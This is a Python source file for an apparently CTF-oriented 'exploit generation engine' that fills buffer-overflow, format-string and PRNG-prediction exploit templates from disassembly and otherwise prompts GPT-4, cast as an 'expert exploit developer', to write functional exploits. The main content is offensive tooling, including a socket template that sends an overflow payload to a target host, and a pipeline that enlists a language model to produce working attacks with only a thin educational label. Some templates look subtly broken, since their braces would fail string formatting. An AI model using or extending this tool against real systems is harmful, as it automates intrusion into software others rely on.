# core/exploit_gen.py
import openai
from typing import Dict, Optional
import json
import re

class ExploitGenerator:
    """AI-powered exploit generation engine"""
    
    def __init__(self, api_key: str):
        self.client = openai.OpenAI(api_key=api_key)
        self.exploit_templates = self._load_templates()
    
    def _load_templates(self) -> Dict:
        """Load exploit templates for different vulnerability types"""
        return {
            'buffer_overflow': {
                'c': '''
#include <stdio.h>
#include <string.h>

int main() {
    char payload[{buffer_size}];
    memset(payload, 'A', sizeof(payload));
    
    // Overwrite return address
    *((unsigned long*)(payload + {offset})) = {return_addr};
    
    // Send payload
    printf("%s\\n", payload);
    return 0;
}
''',
                'python': '''
#!/usr/bin/env python3
import struct
import socket

target = '{target_ip}'
port = {target_port}

payload = b'A' * {buffer_size}
payload += struct.pack('<Q', {return_addr})

# Send exploit
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((target, port))
    s.send(payload)
    print(s.recv(1024))
'''
            },
            'format_string': {
                'c': '''
#include <stdio.h>

int main() {
    // Format string exploit to read/write memory
    printf("{format_string}");
    return 0;
}
''',
                'python': '''
#!/usr/bin/env python3
import sys

# Format string exploit
payload = '{format_string}'
sys.stdout.buffer.write(payload.encode())
'''
            },
            'weak_crypto': {
                'c': '''
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main() {
    // Predict PRNG output
    srand({seed});
    
    for(int i = 0; i < {iterations}; i++) {
        printf("%d\\n", rand());
    }
    
    return 0;
}
''',
                'python': '''
#!/usr/bin/env python3
import random
import ctypes

# Match C stdlib PRNG
def lcg(seed):
    m = 2**31
    a = 1103515245
    c = 12345
    seed = (a * seed + c) % m
    return seed

# Predict values
seed = {seed}
for i in range({iterations}):
    seed = lcg(seed)
    print(seed >> 16)
'''
            }
        }
    
    def generate_exploit(self, vulnerability: Dict, disassembly: str, language: str = 'python') -> str:
        """Generate exploit code based on vulnerability and disassembly"""
        vuln_type = vulnerability['type']
        
        # Use template if available
        if vuln_type in self.exploit_templates and language in self.exploit_templates[vuln_type]:
            template = self.exploit_templates[vuln_type][language]
            params = self._extract_params_from_disasm(disassembly, vuln_type)
            return template.format(**params)
        
        # Otherwise, ask GPT to generate
        prompt = self._create_prompt(vulnerability, disassembly, language)
        response = self.client.chat.completions.create(
            model="gpt-4-turbo-preview",
            messages=[
                {"role": "system", "content": "You are an expert exploit developer. Generate minimal, functional exploits."},
                {"role": "user", "content": prompt}
            ]
        )
        
        return self._extract_code_from_response(response.choices[0].message.content)
    
    def _extract_params_from_disasm(self, disassembly: str, vuln_type: str) -> Dict:
        """Extract exploit parameters from disassembly"""
        params = {}
        
        if vuln_type == 'buffer_overflow':
            # Look for buffer sizes
            buffer_match = re.search(r'sub\s+rsp,\s*0x([0-9a-f]+)', disassembly)
            if buffer_match:
                params['buffer_size'] = int(buffer_match.group(1), 16)
            else:
                params['buffer_size'] = 256  # Default
            
            # Look for vulnerable function calls
            call_match = re.search(r'call\s+.*<([^>]+)>', disassembly)
            if call_match:
                params['vulnerable_function'] = call_match.group(1)
            
            params['offset'] = params['buffer_size'] + 8  # Default offset to return address
            params['return_addr'] = '0x41414141'  # Placeholder
            
        elif vuln_type == 'format_string':
            params['format_string'] = '%x.%x.%x.%x'  # Basic format string for leak
            
        elif vuln_type == 'weak_crypto':
            # Look for srand/rand patterns
            srand_match = re.search(r'mov\s+edi,\s*0x([0-9a-f]+).*\n.*call.*srand', disassembly)
            if srand_match:
                params['seed'] = int(srand_match.group(1), 16)
            else:
                params['seed'] = 0
            
            params['iterations'] = 100  # Default
        
        return params
    
    def _create_prompt(self, vulnerability: Dict, disassembly: str, language: str) -> str:
        """Create GPT prompt for exploit generation"""
        return f"""
Analyze this vulnerable function and generate a working {language} exploit.

Vulnerability type: {vulnerability['type']}
Function: {vulnerability.get('function', 'unknown')}
Reason: {vulnerability.get('reason', 'no reason provided')}

Disassembly:
{disassembly}

Generate minimal, functional exploit code that:
1. Exploits the vulnerability identified
2. Includes comments explaining each step
3. Focuses on reliability and simplicity
4. For CTF/educational purposes only

Code:
"""
    
    def _extract_code_from_response(self, response: str) -> str:
        """Extract code from GPT response"""
        # Extract code block with or without ``` markers
        code_match = re.search(r'```(?:\w+)?\n(.*?)```', response, re.DOTALL)
        if code_match:
            return code_match.group(1).strip()
        
        # If no code block, try to extract indented code
        lines = response.split('\n')
        code_lines = []
        in_code = False
        
        for line in lines:
            if line.startswith('    ') or line.startswith('\t'):
                code_lines.append(line)
                in_code = True
            elif in_code and not line.strip():
                code_lines.append('')
            elif in_code:
                break
        
        if code_lines:
            return '\n'.join(code_lines).strip()
        
        # Last resort: return the whole response
        return response.strip()
    
    def suggest_mitigations(self, vulnerability: Dict) -> str:
        """Generate mitigation suggestions for identified vulnerabilities"""
        prompt = f"""
For a {vulnerability['type']} vulnerability involving {vulnerability.get('function', 'unknown function')}, suggest:
1. Code-level mitigations
2. Compiler-level protections
3. Runtime defenses
4. Best practices to prevent this issue

Format as bullet points.
"""
        
        response = self.client.chat.completions.create(
            model="gpt-4-turbo-preview",
            messages=[
                {"role": "system", "content": "You are a security expert. Provide practical mitigation advice."},
                {"role": "user", "content": prompt}
            ]
        )
        
        return response.choices[0].message.content

